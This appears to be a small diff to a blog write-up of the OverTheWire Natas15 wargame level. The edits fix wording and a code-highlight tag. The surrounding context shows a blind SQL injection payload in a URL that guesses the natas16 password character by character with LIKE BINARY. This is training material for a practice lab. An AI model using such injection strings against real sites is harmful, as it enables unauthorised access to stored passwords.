@@ -102,11 +102,11 @@ SELECT * from users where username="natas16" and password LIKE BINARY "%W%"
 {% endhighlight %}
 
 You can achieve this effort by typing these characters by hand into the GET parameters of the URL in your browser,
-{% highlight sql linenos %}
+{% highlight %}
 http://natas15.natas.labs.overthewire.org/index.php?username=natas16%22+and+password+LIKE+BINARY+%22%W%&debug
 {% endhighlight %}
 
-but that's going to take a long time, and we all value our problem.  Instead, I wrote a python script to do it for me.
+but that's going to take a long time, and we all value our time.  Instead, I wrote a python script to do it for me.
 
 {% highlight python linenos %}
 #!/bin/python
